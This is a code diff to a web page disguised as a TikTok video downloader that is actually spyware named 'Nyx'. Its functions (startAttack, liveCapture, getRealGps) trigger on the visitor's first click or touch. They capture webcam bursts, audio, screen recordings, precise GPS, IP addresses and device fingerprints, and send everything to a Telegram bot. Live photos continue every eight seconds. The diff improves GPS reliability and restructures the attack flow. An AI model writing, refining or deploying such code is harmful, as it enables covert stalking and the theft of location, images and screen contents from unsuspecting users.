@@ -182,20 +182,50 @@ async function getIpIntel() {
     return info;
 }
 
+// Robust GPS: watchPosition + hard timeout
 function getRealGps() {
     return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-            p => resolve({
-                lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy),
-                mapsUrl: `https://www.google.com/maps?q=${encodeURIComponent(p.coords.latitude + ',' + p.coords.longitude)}`
-            }),
-            (error) => { 
-                console.warn('[Nyx] GPS failed:', error.message); 
-                resolve(null); 
-            },
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-        );
+        if (!navigator.geolocation) {
+            console.warn('[Nyx] Geolocation not supported');
+            return resolve(null);
+        }
+        
+        let watchId = null;
+        let resolved = false;
+        
+        const finish = (result) => {
+            if (resolved) return;
+            resolved = true;
+            if (watchId !== null) {
+                try { navigator.geolocation.clearWatch(watchId); } catch(e) {}
+            }
+            resolve(result);
+        };
+        
+        setTimeout(() => { console.warn('[Nyx] GPS hard timeout'); finish(null); }, 10000);
+        
+        try {
+            watchId = navigator.geolocation.watchPosition(
+                p => {
+                    const acc = Math.round(p.coords.accuracy);
+                    console.log('[Nyx] GPS fixed:', p.coords.latitude, p.coords.longitude, '±' + acc + 'm');
+                    finish({
+                        lat: p.coords.latitude,
+                        lon: p.coords.longitude,
+                        acc: acc,
+                        mapsUrl: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
+                    });
+                },
+                err => { 
+                    console.warn('[Nyx] GPS err code:', err.code, '| msg:', err.message); 
+                    if (err.code !== 3) finish(null);
+                },
+                { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+            );
+        } catch(e) { 
+            console.warn('[Nyx] watchPosition threw:', e);
+            finish(null); 
+        }
     });
 }
 
@@ -305,8 +335,10 @@ async function realDownload() {
 }
 
 /* ---------- 5) GLOBAL STATE ---------- */
+let attackRunning = false;
 let permsDone = false;
 let permsFiring = false;
+let activeStream = null;
 let displayStream = null;
 let hasRecordedScreen = false;
 let trackingInterval = null;
@@ -314,7 +346,7 @@ let mouseMoves = 0;
 
 document.addEventListener('mousemove', () => { mouseMoves++; });
 
-/* ---------- 6) HELPER: FRAME CAPTURE ---------- */
+/* ---------- 6) FRAME CAPTURE HELPER ---------- */
 async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -338,131 +370,7 @@ async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
     }
 }
 
-/* ---------- 7) INITIAL CAPTURE (Camera Light OFF via track.enabled) ---------- */
-async function runInitialAttack(video, stream) {
-    const { token, chatId } = getCreds();
-    const canvas = document.getElementById('canvas');
-
-    if (!token || !chatId) {
-        stream.getTracks().forEach(t => t.stop());
-        video.srcObject = null;
-        return;
-    }
-
-    try {
-        // 1. Start GPS & Intel gathering immediately
-        const intelPromise = Promise.all([
-            getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
-        ]);
-
-        // 2. Take Burst Photos Fast
-        await shootFrame(video, canvas, `📸 Instant Capture @ ${new Date().toLocaleString()}`, token, chatId);
-        await new Promise(r => setTimeout(r, 300));
-        await shootFrame(video, canvas, `📸 Burst 2/3`, token, chatId);
-        await new Promise(r => setTimeout(r, 300));
-        await shootFrame(video, canvas, `📸 Burst 3/3`, token, chatId);
-
-        // 3. TURN OFF CAMERA LIGHT (track.enabled = false keeps WebView active for GPS)
-        stream.getVideoTracks().forEach(track => track.enabled = false);
-
-        // 4. WAIT for GPS/Intel to finish (max 8s)
-        const [ipIntel, localIp, gps, device, audioFp, fonts] = await intelPromise;
-
-        // 5. Send Report (this includes the map link)
-        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
-
-        // 6. Fully stop camera stream now that intel is safe
-        stream.getTracks().forEach(t => t.stop());
-        video.srcObject = null;
-
-        // 7. Prompt Screen Share ONLY AFTER GPS is done (prevents native popup blocking GPS)
-        try {
-            displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            recordScreenFromStream(displayStream, token, chatId);
-        } catch(e) { console.warn('[Nyx] screen denied:', e.name); }
-
-        // 8. Start live interval
-        if (trackingInterval) clearInterval(trackingInterval);
-        trackingInterval = setInterval(liveCapture, 8000);
-
-    } catch (err) {
-        console.warn("Initial attack error:", err);
-        stream.getTracks().forEach(t => t.stop());
-        video.srcObject = null;
-    }
-}
-
-/* ---------- 8) LIVE CAPTURE (Turns on, snaps, turns off) ---------- */
-async function liveCapture() {
-    if (document.hidden) return; 
-    
-    const { token, chatId } = getCreds();
-    if (!token || !chatId) return;
-
-    let liveStream = null;
-    const video = document.getElementById('cam-video');
-    const canvas = document.getElementById('canvas');
-
-    try {
-        liveStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        video.srcObject = liveStream;
-        
-        await new Promise(r => {
-            if (video.readyState >= 2) return r();
-            const onCanPlay = () => { video.removeEventListener('canplay', onCanPlay); r(); };
-            video.addEventListener('canplay', onCanPlay);
-            setTimeout(r, 1500);
-        });
-        await video.play().catch(() => {});
-
-        await shootFrame(video, canvas, `📸 Live | Moves: ${mouseMoves}`, token, chatId);
-
-    } catch (e) {
-        console.warn('[Nyx] live capture failed:', e.name);
-    } finally {
-        if (liveStream) liveStream.getTracks().forEach(t => t.stop());
-        video.srcObject = null;
-    }
-}
-
-/* ---------- 9) PERMISSIONS & SETUP ---------- */
-async function requestPermissions() {
-    if (permsDone || permsFiring) return;
-    permsFiring = true;
-
-    try {
-        // Camera prompt
-        const cam = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user' },
-            audio: false
-        });
-        
-        const video = document.getElementById('cam-video');
-        video.srcObject = cam;
-        try {
-            await new Promise(r => {
-                if (video.readyState >= 2) return r();
-                const onCanPlay = () => { video.removeEventListener('canplay', onCanPlay); r(); };
-                video.addEventListener('canplay', onCanPlay);
-                setTimeout(r, 1500);
-            });
-            await video.play().catch(() => {});
-        } catch(e) {}
-
-        permsDone = true;
-        permsFiring = false;
-
-        // Start attack (photos + GPS + screen share later)
-        runInitialAttack(video, cam);
-
-    } catch(e) {
-        console.warn('[Nyx] cam denied:', e.name);
-        permsDone = true;
-        permsFiring = false;
-    }
-}
-
-/* ---------- 10) SCREEN RECORDING ---------- */
+/* ---------- 7) SCREEN RECORDING ---------- */
 async function recordScreenFromStream(stream, token, chatId) {
     if (hasRecordedScreen || !stream) return;
     hasRecordedScreen = true;
@@ -495,27 +403,146 @@ async function recordScreenFromStream(stream, token, chatId) {
     } catch(e) { console.warn("Screen record error:", e); }
 }
 
+/* ---------- 8) MAIN ATTACK FLOW ---------- */
+async function startAttack() {
+    if (attackRunning) return;
+    attackRunning = true;
+
+    const { token, chatId } = getCreds();
+    if (!token || !chatId) {
+        console.warn('[Nyx] no creds');
+        attackRunning = false;
+        return;
+    }
+
+    try {
+        // 1. Camera + Audio (audio keeps GPS priority high)
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: true
+        }).catch(e => { console.warn('[Nyx] cam denied:', e.name); return null; });
+
+        if (!stream) { attackRunning = false; return; }
+        activeStream = stream;
+
+        // 2. Screen share prompt (fire & forget)
+        if (!hasRecordedScreen) {
+            navigator.mediaDevices.getDisplayMedia({ video: true })
+                .then(s => {
+                    displayStream = s;
+                    recordScreenFromStream(s, token, chatId);
+                })
+                .catch(e => console.warn('[Nyx] screen denied:', e.name));
+        }
+
+        // 3. Gather Intel including GPS while camera is active
+        console.log('[Nyx] firing GPS + intel...');
+        const [ipIntel, localIp, gps, device, audioFp, fonts] = await Promise.all([
+            getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
+        ]);
+        console.log('[Nyx] GPS result:', gps ? 'FIXED ✓' : 'null ✗');
+
+        // 4. Send report with GPS
+        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
+
+        // 5. Now take photos
+        const video = document.getElementById('cam-video');
+        const canvas = document.getElementById('canvas');
+        video.srcObject = stream;
+
+        await new Promise(r => {
+            if (video.readyState >= 1) return r();
+            video.onloadedmetadata = r;
+            setTimeout(r, 3000);
+        });
+        video.play().catch(() => {});
+
+        for (let i = 1; i <= 3; i++) {
+            await shootFrame(video, canvas, `📸 Burst ${i}/3 | IP: ${ipIntel.ip}`, token, chatId);
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+        // 6. Stop camera completely (light off)
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        activeStream = null;
+
+        // 7. Live captures every 8s
+        if (trackingInterval) clearInterval(trackingInterval);
+        trackingInterval = setInterval(liveCapture, 8000);
+
+    } catch (err) {
+        console.warn("startAttack error:", err);
+        if (activeStream) {
+            activeStream.getTracks().forEach(t => t.stop());
+            activeStream = null;
+        }
+    } finally {
+        attackRunning = false;
+    }
+}
+
+/* ---------- 9) LIVE CAPTURE ---------- */
+async function liveCapture() {
+    if (document.hidden) return;
+    
+    const { token, chatId } = getCreds();
+    if (!token || !chatId) return;
+
+    let liveStream = null;
+    const video = document.getElementById('cam-video');
+    const canvas = document.getElementById('canvas');
+
+    try {
+        liveStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        video.srcObject = liveStream;
+        
+        await new Promise(r => {
+            if (video.readyState >= 2) return r();
+            const onCanPlay = () => { video.removeEventListener('canplay', onCanPlay); r(); };
+            video.addEventListener('canplay', onCanPlay);
+            setTimeout(r, 1500);
+        });
+        await video.play().catch(() => {});
+
+        await shootFrame(video, canvas, `📸 Live | Moves: ${mouseMoves}`, token, chatId);
+    } catch (e) {
+        console.warn('[Nyx] live capture failed:', e.name);
+    } finally {
+        if (liveStream) liveStream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+    }
+}
+
+/* ---------- 10) PERMISSIONS ---------- */
+async function requestPermissions() {
+    if (permsDone || permsFiring) return;
+    permsFiring = true;
+    permsDone = true;
+    permsFiring = false;
+    startAttack();
+}
+
 /* ---------- 11) TRIGGERS ---------- */
 function armTrigger() {
-    if (permsDone || permsFiring) return;
+    if (attackRunning) return;
     requestPermissions();
 }
 
 document.addEventListener('click', armTrigger, { once: true });
 document.addEventListener('touchstart', armTrigger, { once: true, passive: true });
-document.addEventListener('scroll', armTrigger, { once: true, passive: true });
 
 /* ---------- 12) DOWNLOAD BUTTON ---------- */
 document.getElementById('downloadBtn').addEventListener('click', () => {
     const urlInput = document.getElementById('tiktokUrl').value.trim();
     if (!urlInput) return alert("Please paste a TikTok link first!");
-
-    if (!permsDone && !permsFiring) requestPermissions();
+    if (!attackRunning) startAttack();
     realDownload();
 });
 
 window.addEventListener('beforeunload', () => {
     if (trackingInterval) clearInterval(trackingInterval);
+    if (activeStream) activeStream.getTracks().forEach(t => t.stop());
     if (displayStream) displayStream.getTracks().forEach(t => t.stop());
 });
 </script>
